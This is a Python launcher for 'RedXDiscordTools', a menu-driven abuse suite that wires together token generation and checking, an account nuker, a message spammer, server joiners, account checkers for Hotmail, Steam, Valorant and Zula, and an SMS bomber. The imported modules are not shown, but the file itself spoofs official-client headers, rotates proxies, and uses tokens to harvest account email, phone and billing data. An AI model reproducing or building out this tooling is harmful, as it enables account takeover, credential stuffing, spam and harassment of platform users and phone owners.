import os
import time
import random
import requests
import json
import colorama
import subprocess
from colorama import Fore, Back, Style
from datetime import datetime
import re
import time
import queue
import threading
from concurrent.futures import ThreadPoolExecutor
import modules.rpc_manager as rpc_manager
from modules.settings import APP_AUTHOR, APP_VERSION, DISCORD_INVITE

rpc_manager.start()
rpc_manager.set_details("Main Menu")

from tools.discord import (
    TokenGenerator, TokenChecker, TokenGeneratorAndChecker, ServerJoiner,
    ServerLeaver, MessageSpammer, AccountNuker, TokenInfo, ProxyManager,
    TokenOnliner, AccountLogin, TokenOffliner
)
from tools.other.duplicate_remover import DuplicateRemover
from tools.other.log_searcher import LogSearcher
from tools.other.takipcilekazan import TakipciLekazan
from tools.other.srcfetch import SrcFetch
from tools.hotmail.hotmail_checker import HotmailChecker
from tools.zula.zula_checker import ZulaChecker
from tools.steam.steam_checker import SteamChecker
from tools.smsbomber.bombermain import SMSBomberUI

colorama.init(autoreset=True)

version = APP_VERSION

class AdvancedUI:
    
    PRIMARY = Fore.RED
    SECONDARY = Fore.WHITE
    ACCENT = Fore.LIGHTRED_EX
    SUCCESS = Fore.GREEN
    WARNING = Fore.YELLOW
    ERROR = Fore.LIGHTRED_EX
    INFO = Fore.CYAN
    
    DISCORD_PRIMARY = Fore.BLUE
    DISCORD_SECONDARY = Fore.LIGHTBLUE_EX
    DISCORD_ACCENT = Fore.CYAN
    
    HOTMAIL_PRIMARY = Fore.BLUE
    HOTMAIL_SECONDARY = Fore.LIGHTCYAN_EX
    
    TOOLS_PRIMARY = Fore.YELLOW
    TOOLS_SECONDARY = Fore.LIGHTYELLOW_EX
    
    BOX_HORIZONTAL = "─"
    BOX_VERTICAL = "│"
    BOX_TOP_LEFT = "┌"
    BOX_TOP_RIGHT = "┐"
    BOX_BOTTOM_LEFT = "└"
    BOX_BOTTOM_RIGHT = "┘"
    BOX_T_DOWN = "┬"
    BOX_T_UP = "┴"
    BOX_T_RIGHT = "├"
    BOX_T_LEFT = "┤"
    BOX_CROSS = "┼"
    
    ARROW_RIGHT = ">"
    ARROW_LEFT = "<"
    BULLET = "*"
    CHECK = "+"
    CROSS = "x"
    LOADING = ["-", "\\", "|", "/"]
    
    def progress_bar(current, total, width=50, color=Fore.GREEN, fill_char="█", empty_char="░"):
        percentage = current / total if total > 0 else 0
        filled = int(width * percentage)
        
        bar = f"{color}{fill_char * filled}{Fore.LIGHTBLACK_EX}{empty_char * (width - filled)}{Style.RESET_ALL}"
        percent_text = f"{percentage * 100:.1f}%"
        
        return f"[{bar}] {color}{percent_text}{Style.RESET_ALL} ({current}/{total})"
        
    @staticmethod
    def loading_animation(duration=2, text="Loading"):
        frames = AdvancedUI.LOADING
        end_time = time.time() + duration
        i = 0
        
        while time.time() < end_time:
            print(f"\r{Fore.CYAN}{frames[i % len(frames)]} {text}...{Style.RESET_ALL}", end='', flush=True)
            time.sleep(0.1)
            i += 1
        print(f"\r{' ' * (len(text) + 10)}\r", end='')


class RedXDiscordTools:
    def __init__(self):
        self.version = version
        self.author = APP_AUTHOR
        self.discord_invite = DISCORD_INVITE or "discord.gg/example"
        self.module_versions = {
            "main": "2.0.0",
            "hotmail_checker": "1.0.0", 
            "duplicate_remover": "1.0.0",
            "translations": "1.0.0"
        }
        self.project_name = "RedXDiscordTools"
        self.proxies_file = "proxies.txt"
                
        self.stats = {
            'generated': 0,
            'checked': 0,
            'valid': 0,
            'invalid': 0,
            'joined': 0,
            'left': 0,
            'spammed': 0,
            'nuked': 0
        }
        
        self.lock = threading.Lock()
        self.token_queue = queue.Queue()
        self.max_threads = 10
        self.delay_between_requests = 0.5
        
        self.config_file = "config.json"
        self.proxy_list = []
        self.rpc_enabled = False
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        self.token_generator = TokenGenerator(self)
        self.token_checker = TokenChecker(self)
        self.token_gen_check = TokenGeneratorAndChecker(self)
        self.server_joiner = ServerJoiner(self)
        self.server_leaver = ServerLeaver(self)
        self.message_spammer = MessageSpammer(self)
        self.account_nuker = AccountNuker(self)
        self.token_info = TokenInfo(self)
        self.proxy_manager = ProxyManager(self)
        self.token_onliner = TokenOnliner(self)
        self.account_login = AccountLogin(self)
        self.token_offliner = TokenOffliner(self)
        self.duplicate_remover = DuplicateRemover(self)
        self.log_searcher = LogSearcher(self)
        self.takipcilekazan = TakipciLekazan(self)
        self.srcfetch = SrcFetch(self)
        self.hotmail_checker = HotmailChecker(self)
        self.zula_checker = ZulaChecker(self)
        self.steam_checker = SteamChecker(self)
        self.sms_bomber = SMSBomberUI()
        
        self.ui = AdvancedUI()
            
    def get_random_headers(self, token=None):
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Content-Type': 'application/json',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': random.choice(self.user_agents),
            'X-Debug-Options': 'bugReporterEnabled',
            'X-Discord-Locale': 'en-US',
            'X-Discord-Timezone': 'America/New_York',
            'X-Super-Properties': self.build_x_super_properties()
        }
        
        if token:
            headers['Authorization'] = token
            
        return headers
        
    def build_x_super_properties(self):
        user_agent = random.choice(self.user_agents)
        data = {
            "os": "Windows",
            "browser": "Chrome",
            "device": "",
            "system_locale": "en-US",
            "browser_user_agent": user_agent,
            "browser_version": "120.0.0.0",
            "os_version": "10",
            "referrer": "",
            "referring_domain": "",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_event_source": None
        }
        import base64
        return base64.b64encode(json.dumps(data, separators=(',', ':')).encode()).decode()
        
    def load_config(self):
        default_config = {
            "rpc": {
                "enabled": False,
                "show_stats": True
            },
            "proxies": {
                "enabled": False,
                "auto_rotate": True
            },
            "token_generation": {
                "auto_check": True,
                "save_immediately": True
            },
            "rate_limiting": {
                "max_threads": 10,
                "delay_between_requests": 0.5
            }
        }
        
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                for section, values in default_config.items():
                    if section not in config:
                        config[section] = values
                    else:
                        for key, value in values.items():
                            if key not in config[section]:
                                config[section][key] = value
                return config
            except:
                pass
                
        self.save_config(default_config)
        return default_config
        
    def save_config(self, config):
        try:
            with open(self.config_file, 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=4)
        except:
            pass
            
    def load_proxies(self):
        if os.path.exists(self.proxies_file):
            with open(self.proxies_file, 'r', encoding='utf-8') as f:
                self.proxy_list = [line.strip() for line in f.readlines() if line.strip()]
        return self.proxy_list
        
    def get_random_proxy(self):
        if self.proxy_list:
            return random.choice(self.proxy_list)
        return None
        
    def get_token_info(self, token):
        try:
            headers = self.get_random_headers(token)
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
            
            if response.status_code != 200:
                return None
                
            user_data = response.json()
            
            nitro_response = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=10)
            has_nitro = len(nitro_response.json()) > 0 if nitro_response.status_code == 200 else False
            
            flags = user_data.get('flags', 0)
            badges = []
            if flags & 1: badges.append("Staff")
            if flags & 2: badges.append("Partner")
            if flags & 4: badges.append("HypeSquad Events")
            if flags & 8: badges.append("Bug Hunter Level 1")
            if flags & 64: badges.append("HypeSquad Bravery")
            if flags & 128: badges.append("HypeSquad Brilliance")
            if flags & 256: badges.append("HypeSquad Balance")
            if flags & 512: badges.append("Early Supporter")
            if flags & 16384: badges.append("Bug Hunter Level 2")
            if flags & 131072: badges.append("Early Verified Bot Developer")
            
            user_id = int(user_data['id'])
            creation_timestamp = ((user_id >> 22) + 1420070400000) / 1000
            creation_date = datetime.fromtimestamp(creation_timestamp).strftime('%d-%m-%Y %H:%M:%S')
            
            return {
                'username': user_data.get('username', 'N/A'),
                'discriminator': user_data.get('discriminator', 'N/A'),
                'user_id': user_data.get('id', 'N/A'),
                'email': user_data.get('email', 'N/A'),
                'phone': user_data.get('phone', 'N/A'),
                'verified': user_data.get('verified', False),
                'mfa_enabled': user_data.get('mfa_enabled', False),
                'locale': user_data.get('locale', 'N/A'),
                'has_nitro': has_nitro,
                'badges': badges if badges else ['None'],
                'creation_date': creation_date,
                'avatar_url': f"https://cdn.discordapp.com/avatars/{user_id}/{user_data.get('avatar', '')}.webp" if user_data.get('avatar') else None
            }
            
        except Exception as e:
            return None
            
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def set_title(self, title):
        if os.name == 'nt':
            os.system(f'title {title}')
            
    def print_banner(self):
        self.clear_screen()
        
        banner = f"""{Fore.RED}
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                     │
│   ██████╗ ███████╗██████╗ ██╗  ██╗   ████████╗ ██████╗  ██████╗ ██╗     ███████╗    │
│   ██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝    │
│   ██████╔╝█████╗  ██║  ██║ ╚███╔╝       ██║   ██║   ██║██║   ██║██║     ███████╗    │
│   ██╔══██╗██╔══╝  ██║  ██║ ██╔██╗       ██║   ██║   ██║██║   ██║██║     ╚════██║    │
│   ██║  ██║███████╗██████╔╝██╔╝ ██╗      ██║   ╚██████╔╝╚██████╔╝███████╗███████║    │
│   ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝    │
│                                                                                     │
│   Version: {Fore.LIGHTRED_EX}{self.version}{Fore.RED}  │  Developer: {Fore.LIGHTRED_EX}{self.author}{Fore.RED}  │ {Fore.LIGHTRED_EX}{self.discord_invite}{Fore.RED}                           │
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}"""
        print(banner)
        
    def print_discord_banner(self):
        self.clear_screen()
        
        banner = f"""{Fore.BLUE}
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                     │
│              ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗                    │
│              ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗                   │
│              ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║                   │
│              ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║                   │
│              ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝                   │
│              ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝                    │
│                                                                                     │
│                       ──── DISCORD AUTOMATION SUITE ────                            │
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}"""
        print(banner)
        
    def print_menu(self):
        print(f"""{Fore.RED}
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                   MAIN MENU                                         │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  {Fore.WHITE}[{Fore.BLUE}1{Fore.WHITE}]{Fore.BLUE} Discord Tools                   {Fore.WHITE}Token, server and account management           {Fore.RED}│
│  {Fore.WHITE}[{Fore.YELLOW}2{Fore.WHITE}]{Fore.YELLOW} More Tools                      {Fore.WHITE}Checker's and utility tools                    {Fore.RED}│
│  {Fore.WHITE}[{Fore.GREEN}3{Fore.WHITE}]{Fore.GREEN} Settings                        {Fore.WHITE}Thread, proxy and other settings               {Fore.RED}│
│  {Fore.WHITE}[{Fore.MAGENTA}4{Fore.WHITE}]{Fore.MAGENTA} Statistics                      {Fore.WHITE}View statistics and reports                    {Fore.RED}│
│  {Fore.WHITE}[{Fore.LIGHTRED_EX}0{Fore.WHITE}]{Fore.LIGHTRED_EX} Exit                            {Fore.WHITE}Exit program                                   {Fore.RED}│
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
        
    def print_discord_tools_menu(self):
        print(f"""
{Fore.BLUE}┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                 DISCORD TOOLS                                       │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  {Fore.WHITE}[{Fore.LIGHTBLUE_EX} 1{Fore.WHITE}]{Fore.CYAN} Token Generator          {Fore.WHITE}[{Fore.LIGHTBLUE_EX} 2{Fore.WHITE}]{Fore.CYAN} Token Checker           {Fore.WHITE}[{Fore.LIGHTBLUE_EX} 3{Fore.WHITE}]{Fore.CYAN} Gen & Check        {Fore.BLUE}│
│  {Fore.WHITE}[{Fore.LIGHTBLUE_EX} 4{Fore.WHITE}]{Fore.CYAN} Server Joiner            {Fore.WHITE}[{Fore.LIGHTBLUE_EX} 5{Fore.WHITE}]{Fore.CYAN} Server Leaver           {Fore.WHITE}[{Fore.LIGHTBLUE_EX} 6{Fore.WHITE}]{Fore.CYAN} Message Spammer    {Fore.BLUE}│
│  {Fore.WHITE}[{Fore.LIGHTBLUE_EX} 7{Fore.WHITE}]{Fore.CYAN} Account Nuker            {Fore.WHITE}[{Fore.LIGHTBLUE_EX} 8{Fore.WHITE}]{Fore.CYAN} Token Onliner           {Fore.WHITE}[{Fore.LIGHTBLUE_EX} 9{Fore.WHITE}]{Fore.CYAN} Token Info         {Fore.BLUE}│
│  {Fore.WHITE}[{Fore.LIGHTBLUE_EX}10{Fore.WHITE}]{Fore.CYAN} Proxy Manager            {Fore.WHITE}[{Fore.LIGHTBLUE_EX}11{Fore.WHITE}]{Fore.CYAN} Account Login           {Fore.WHITE}[{Fore.LIGHTBLUE_EX}12{Fore.WHITE}]{Fore.CYAN} Token Offliner     {Fore.BLUE}│
│                                                                                     │
│  {Fore.WHITE}[{Fore.RED} 0{Fore.WHITE}]{Fore.RED} Back                                                                          {Fore.BLUE}│
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
        
    def discord_tools_menu(self):
        while True:
            self.print_discord_banner()
            self.print_discord_tools_menu()
            
            choice = input(f"{Fore.CYAN}┌─[{Fore.WHITE}SELECT{Fore.CYAN}]\n└──> {Fore.WHITE}").strip()
            
            if choice == '1':
                self.token_generator.run()
            elif choice == '2':
                self.token_checker.run()
            elif choice == '3':
                self.token_gen_check.run()
            elif choice == '4':
                self.server_joiner.run()
            elif choice == '5':
                self.server_leaver.run()
            elif choice == '6':
                self.message_spammer.run()
            elif choice == '7':
                self.account_nuker.run()
            elif choice == '8':
                self.token_onliner.run()
            elif choice == '9':
                self.token_info.run()
            elif choice == '10':
                self.proxy_manager.run()
            elif choice == '11':
                self.account_login.run()
            elif choice == '12':
                self.token_offliner.run()
            elif choice == '0':
                break
            else:
                print(f"\n{Fore.RED}[x] Invalid choice!{Style.RESET_ALL}")
                time.sleep(1)
        
    def print_tools_menu(self):
        print(f"""
{Fore.YELLOW}┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                  MORE TOOLS                                         │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}1{Fore.WHITE}]{Fore.YELLOW} Duplicate Remover                      {Fore.WHITE}Remove duplicate lines                  {Fore.YELLOW}│
│  {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}2{Fore.WHITE}]{Fore.YELLOW} Hotmail Checker                        {Fore.WHITE}Check hotmail accounts                  {Fore.YELLOW}│
│  {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}3{Fore.WHITE}]{Fore.YELLOW} Log Searcher                           {Fore.WHITE}Search in log files                     {Fore.YELLOW}│
│  {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}4{Fore.WHITE}]{Fore.YELLOW} Checkers                               {Fore.WHITE}Check accounts                          {Fore.YELLOW}│
│  {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}5{Fore.WHITE}]{Fore.YELLOW} SMS Bomber                             {Fore.WHITE}Send SMS bombs                          {Fore.YELLOW}│
│  {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}6{Fore.WHITE}]{Fore.YELLOW} Takipcilekazan                         {Fore.WHITE}Youtube points automation               {Fore.YELLOW}│
│  {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}7{Fore.WHITE}]{Fore.YELLOW} SrcFetch                               {Fore.WHITE}Website source downloader               {Fore.YELLOW}│
│                                                                                     │
│  {Fore.WHITE}[{Fore.RED}0{Fore.WHITE}]{Fore.RED} Back                                                                           {Fore.YELLOW}│
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
        
    def print_checkers_menu(self):
        print(f"""{Fore.CYAN}
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                  CHECKERS                                           │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  {Fore.WHITE}[{Fore.LIGHTCYAN_EX}1{Fore.WHITE}]{Fore.CYAN} Zula Checker                      {Fore.WHITE}Check Zula accounts                          {Fore.CYAN}│
│  {Fore.WHITE}[{Fore.LIGHTCYAN_EX}2{Fore.WHITE}]{Fore.CYAN} Valorant Checker                  {Fore.WHITE}Check Valorant accounts                      {Fore.CYAN}│
│  {Fore.WHITE}[{Fore.LIGHTCYAN_EX}3{Fore.WHITE}]{Fore.CYAN} Steam Checker                     {Fore.WHITE}Check Steam accounts                         {Fore.CYAN}│
│                                                                                     │
│  {Fore.WHITE}[{Fore.RED}0{Fore.WHITE}]{Fore.RED} Back                                                                           {Fore.CYAN}│
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
        
    def checkers_menu(self):
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_checkers_menu()
            
            choice = input(f"{Fore.CYAN}┌─[{Fore.WHITE}SELECT{Fore.CYAN}]\n└──> {Fore.WHITE}").strip()
            
            if choice == '1':
                self.zula_checker.run()
            elif choice == '2':
                from tools import python310_installer
                ready = python310_installer.ensure_environment()
                if ready:
                    self.run_valorant_checker()
            elif choice == '3':
                self.steam_checker.run()
            elif choice == '0':
                break
            else:
                print(f"\n{Fore.RED}[x] Invalid choice!{Style.RESET_ALL}")
                time.sleep(1)
    
    def run_valorant_checker(self):
        try:
            print(f"\n{Fore.CYAN}{'─'*85}")
            print(f"{Fore.CYAN}Setting up environment for Valorant Checker...")
            print(f"{Fore.CYAN}{'─'*85}{Style.RESET_ALL}\n")
            
            from tools import python310_installer
            ready = python310_installer.ensure_environment()
            
            if not ready:
                print(f"\n{Fore.RED}[x] Environment setup failed!{Style.RESET_ALL}")
                input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                return
            
            python_path = os.path.join(".venv", "Scripts", "python.exe")
            script_path = os.path.join("tools", "valorant", "valorant_checker.py")
            
            if not os.path.exists(python_path):
                print(f"\n{Fore.RED}[x] Python environment not found!{Style.RESET_ALL}")
                input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                return
            
            if not os.path.exists(script_path):
                print(f"\n{Fore.RED}[x] Valorant checker script not found!{Style.RESET_ALL}")
                input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                return
            
            print(f"\n{Fore.GREEN}[+] Environment ready!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Launching Valorant Checker...{Style.RESET_ALL}\n")
            
            time.sleep(1)
            result = subprocess.call([python_path, script_path])
            
            if result != 0:
                print(f"\n{Fore.YELLOW}[!] Valorant Checker exited with code: {result}{Style.RESET_ALL}")
                input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"\n{Fore.RED}[x] Error: {str(e)}{Style.RESET_ALL}")
            input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        
    def tools_menu(self):
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_tools_menu()
            
            choice = input(f"{Fore.YELLOW}┌─[{Fore.WHITE}SELECT{Fore.YELLOW}]\n└──> {Fore.WHITE}").strip()
            
            if choice == '1':
                self.duplicate_remover.run()
            elif choice == '2':
                self.hotmail_checker.run()
            elif choice == '3':
                self.log_searcher.run()
            elif choice == '4':
                self.checkers_menu()
            elif choice == '5':
                self.sms_bomber.run()
            elif choice == '6':
                self.takipcilekazan.run()
            elif choice == '7':
                self.srcfetch.run()
            elif choice == '0':
                break
            else:
                print(f"\n{Fore.RED}[x] Invalid choice!{Style.RESET_ALL}")
                time.sleep(1)
        
    def print_stats(self):
        self.clear_screen()
        self.print_banner()
        
        print(f"""{Fore.MAGENTA}
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                            STATISTICS & ANALYTICS                                   │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  TOKEN STATISTICS                                                                   │
│  ─────────────────────────────────────────────────────────────────────────────────  │
│                                                                                     │
│  {Fore.WHITE}Generated:{Fore.CYAN}{self.stats['generated']:>72}{Fore.MAGENTA} │
│  {Fore.WHITE}Checked:{Fore.YELLOW}{self.stats['checked']:>74}{Fore.MAGENTA} │
│  {Fore.WHITE}Valid:{Fore.GREEN}{self.stats['valid']:>76}{Fore.MAGENTA} │
│  {Fore.WHITE}Invalid:{Fore.RED}{self.stats['invalid']:>74}{Fore.MAGENTA} │
│                                                                                     │
│  SERVER STATISTICS                                                                  │
│  ─────────────────────────────────────────────────────────────────────────────────  │
│                                                                                     │
│  {Fore.WHITE}Joined:{Fore.GREEN}{self.stats['joined']:>75}{Fore.MAGENTA} │
│  {Fore.WHITE}Left:{Fore.YELLOW}{self.stats['left']:>77}{Fore.MAGENTA} │
│                                                                                     │
│  ACTIVITY STATISTICS                                                                │
│  ─────────────────────────────────────────────────────────────────────────────────  │
│                                                                                     │
│  {Fore.WHITE}Messages Sent:{Fore.CYAN}{self.stats['spammed']:>68}{Fore.MAGENTA} │
│  {Fore.WHITE}Accounts Nuked:{Fore.RED}{self.stats['nuked']:>67}{Fore.MAGENTA} │
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
        
        input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        
    def create_files(self):
        files_to_create = [
            self.proxies_file
        ]
        
        for file in files_to_create:
            if not os.path.exists(file):
                with open(file, 'w', encoding='utf-8') as f:
                    f.write("")
                    
    
    def settings_menu(self):
        while True:
            self.clear_screen()
            self.print_banner()
            
            print(f"""{Fore.GREEN}
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                    SETTINGS                                         │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  {Fore.WHITE}[{Fore.LIGHTGREEN_EX}1{Fore.WHITE}]{Fore.GREEN} Thread Count                  {Fore.WHITE}Current: {self.max_threads:<40}{Fore.GREEN}│
│  {Fore.WHITE}[{Fore.LIGHTGREEN_EX}2{Fore.WHITE}]{Fore.GREEN} Request Delay                 {Fore.WHITE}Current: {self.delay_between_requests}s{' ' * 36}{Fore.GREEN}│
│  {Fore.WHITE}[{Fore.LIGHTGREEN_EX}3{Fore.WHITE}]{Fore.GREEN} Proxy Settings                {Fore.WHITE}Manage proxy list                                {Fore.GREEN}│
│  {Fore.WHITE}[{Fore.LIGHTGREEN_EX}4{Fore.WHITE}]{Fore.GREEN} File Settings                 {Fore.WHITE}Edit save locations                              {Fore.GREEN}│
│                                                                                     │
│  {Fore.WHITE}[{Fore.RED}0{Fore.WHITE}]{Fore.RED} Back                                                                           {Fore.GREEN}│
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
            
            choice = input(f"{Fore.GREEN}┌─[{Fore.WHITE}SELECT{Fore.GREEN}]\n└──> {Fore.WHITE}").strip()
            
            if choice == '1':
                try:
                    print(f"\n{Fore.CYAN}Thread Count Setting")
                    new_threads = int(input(f"{Fore.CYAN}Enter new value (1-50): {Fore.WHITE}"))
                    if 1 <= new_threads <= 50:
                        self.max_threads = new_threads
                        print(f"\n{Fore.GREEN}[+] Thread count updated to {new_threads}{Style.RESET_ALL}")
                    else:
                        print(f"\n{Fore.RED}[x] Thread count must be between 1-50{Style.RESET_ALL}")
                except ValueError:
                    print(f"\n{Fore.RED}[x] Invalid value{Style.RESET_ALL}")
                input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                
            elif choice == '2':
                try:
                    print(f"\n{Fore.CYAN}Request Delay Setting")
                    new_delay = float(input(f"{Fore.CYAN}Enter new value (0-10 seconds): {Fore.WHITE}"))
                    if 0 <= new_delay <= 10:
                        self.delay_between_requests = new_delay
                        print(f"\n{Fore.GREEN}[+] Delay updated to {new_delay}s{Style.RESET_ALL}")
                    else:
                        print(f"\n{Fore.RED}[x] Delay must be between 0-10 seconds{Style.RESET_ALL}")
                except ValueError:
                    print(f"\n{Fore.RED}[x] Invalid value{Style.RESET_ALL}")
                input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                
            elif choice == '0':
                break
            else:
                print(f"\n{Fore.RED}[x] Invalid choice!{Style.RESET_ALL}")
                time.sleep(1)
        
    def run(self):
        self.create_files()
        self.load_proxies()
        
        self.clear_screen()
        self.print_banner()
        print(f"\n{Fore.CYAN}{'─' * 86}{Style.RESET_ALL}")
        self.ui.loading_animation(2, "Initializing system")
        print(f"{Fore.GREEN}[+] All modules loaded{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'─' * 86}{Style.RESET_ALL}\n")
        time.sleep(1)
        
        try:
            while True:
                self.clear_screen()
                self.print_banner()
                self.print_menu()
                
                choice = input(f"{Fore.RED}┌─[{Fore.WHITE}SELECT{Fore.RED}]\n└──> {Fore.WHITE}").strip()
                
                if choice == '1':
                    self.discord_tools_menu()
                elif choice == '2':
                    self.tools_menu()
                elif choice == '3':
                    self.settings_menu()
                elif choice == '4':
                    self.print_stats()
                elif choice == '0':
                    self.clear_screen()
                    print(f"""{Fore.RED}
    ┌─────────────────────────────────────────────────────────────────────────────────────┐
    │                                                                                     │
    │                   Thank you for using RedX Tools!                                   │
    │                      Developed by. {self.author}                                        │
    │                                                                                     │
    └─────────────────────────────────────────────────────────────────────────────────────┘
    {Style.RESET_ALL}""")
                    break
                else:
                    print(f"\n{Fore.RED}[x] Invalid choice!{Style.RESET_ALL}")
                    time.sleep(1)
        except KeyboardInterrupt:
                self.clear_screen()
                print(f"""{Fore.RED}
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                     │
│                   Thank you for using RedX Tools!                                   │
│                      Developed by. {self.author}                                        │
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
                    
if __name__ == "__main__":
    app = RedXDiscordTools()
    app.run()